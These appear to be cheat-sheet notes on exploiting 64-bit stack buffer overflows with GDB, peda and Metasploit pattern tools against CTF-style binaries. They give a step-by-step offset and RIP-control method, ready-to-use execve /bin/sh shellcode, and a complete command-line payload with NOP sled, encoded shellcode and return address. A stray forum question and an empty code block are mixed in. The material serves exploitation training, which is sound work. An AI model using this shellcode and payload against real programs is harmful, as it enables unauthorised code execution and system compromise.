# GDB

## 64 Bit

Step 1: Generate a pattern, copy and paste this as input to the binary (use pattern_create.rb from
Metasploit)
or gdb-peda -> pattern arg 2000 (runs program with arg)

Step 2: Read and copy the value from register RBP for the offset. 

Step 3: Calculate the offset. (use pattern_offset.rb from Metasploit) 
gdb-peda > patts

```console
Registers point to pattern buffer:
[RSI] --> offset 1982 - size ~18
[RDI] --> offset 1982 - size ~18
[RSP] --> offset 1032 - size ~203
``` 
Step 4: Try control the register RIP with the following payload  
Junk*(offset value) + 8 bytes of dummy  
Step 5: Read the stack or register RSP to find a suitable return address.  
Step 6: The general payload should be like below  
Nop + shellcode + Junks + return address  

Hint 2: Working shellcode

\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05

Hint 3: Running the payload with the binary

(python -c "print('\x90'*(fill in the number) + (shellcode) + 'A'*(fill in the number)
+(return address))";cat) | ./bof64

```console
Running Payload outside GDB
$ ./leave_msg $(python -c "print '\x55' * 1841 + '\x90' * 124 + '\xda\xc3\xb8\x7d\x24\xf0\x6e\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\x83\xea\xfc\x31\x42\x13\x03\x3f\x37\x12\x9b\x8e\xec\x25\x87\xa3\x51\x99\x22\x41\xdf\xfc\x03\x23\x12\x7e\xf0\xf2\x1c\x40\x3a\x84\x14\xc6\x3d\xec\xd9\x38\xbe\xed\x4d\x3b\xbe\xfc\xd1\xb2\x5f\x4e\x8f\x94\xce\xfd\xe3\x16\x78\xe0\xc9\x99\x28\x8a\xbf\xb6\xbf\x22\x28\xe6\x10\xd0\xc1\x71\x8d\x46\x41\x0b\xb3\xd6\x6e\xc6\xb4' + '\x2c\xd7\xff\xff'")
```

## Commands

```console
(gdb) set disassembly-flavor intel
- Set the Intel syntax

(gdb) disassemble main
- disassemble the program's main function

(gdb) x/2000xb $esp+500
-examine 
```

## Fuzzing

```console
$ echo $(python -c 'print("A" * 650)') | ./bof
(gdb) run $(python -c 'print("A" * 650)')
(gdb) r < <(python -c 'print("A" * 650)')
```

## Using GDB
Hello there can anyone explain me the difference between these to commands? Sometime the first one is working and sometimes only the second one 

```console

```

```console
$ gdb -q ./bof
Reading symbols from ./bof...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) r < <(python -c 'print("A" * 650)')
Starting program: /home/des/bof < <(python -c 'print("A" * 650)')
Enter some string:

Program received signal SIGSEGV, Segmentation fault.
0x000055555555484e in foo ()
(gdb) i r
rax            0x0      0
rbx            0x3e9    1001
rcx            0x0      0
rdx            0x0      0
rsi            0x555555554956   93824992233814
rdi            0x7ffff7dd0760   140737351845728
rbp            0x4141414141414141       0x4141414141414141
rsp            0x7fffffffe3b8   0x7fffffffe3b8
r8             0xffffffffffffffed       -19
r9             0x25e    606
r10            0x5555557564cb   93824994337995
r11            0x555555554956   93824992233814
r12            0x3e9    1001
r13            0x7fffffffe4b0   140737488348336
r14            0x0      0
r15            0x0      0
rip            0x55555555484e   0x55555555484e <foo+84>
eflags         0x10206  [ PF IF RF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x0      0
gs             0x0      0

(gdb) x/xg $rsp
0x7fffffffe3b8: 0x3775413675413575
```

Create a pattern with 650 bytes, run it and check the offset with the **rsp** `0x3775413675413575`

```console
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x3775413675413575
[*] Exact match at offset 616
```